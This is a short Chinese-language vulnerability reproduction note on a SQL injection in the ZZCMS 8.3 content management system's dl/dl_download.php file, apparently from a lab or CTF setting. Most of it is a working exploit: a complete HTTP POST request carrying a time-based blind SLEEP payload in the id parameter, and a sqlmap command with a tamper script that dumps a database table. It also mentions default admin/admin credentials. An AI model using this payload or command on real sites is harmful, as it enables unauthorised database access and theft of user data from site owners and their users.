## 1. 漏洞介绍

站长招商网内容管理系统简称 ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms8.3中dl/dl_download.php存在sql注入

[ZZCMS2021 sqlinject(1) · GitHub](https://gist.github.com/aaaahuia/1343e3aa06b031ea621b5701cebcee3e)

## 2. 漏洞复现

poc

```http
POST /dl/dl_download.php HTTP/1.1
Host: your host
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://zzcms.com
Connection: close
Referer: http://zzcms.com/dl/dl_download.php
Cookie: UserName=test; PassWord=098f6bcd4621d373cade4e832627b4f6
Upgrade-Insecure-Requests: 1

id[0]=0&id[1]=1 AND (SELECT 5584 FROM (SELECT(SLEEP(9)))a)
```

以普通用户【后台admin/admin可查看所有用户信息】登录抓包跑sqlmap

```bash
python  sqlmap.py -r post.txt -p id[1] --batch  --hex --tamper="between.py"  -D zzcms -T flag --dump
```

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312232027606.png)
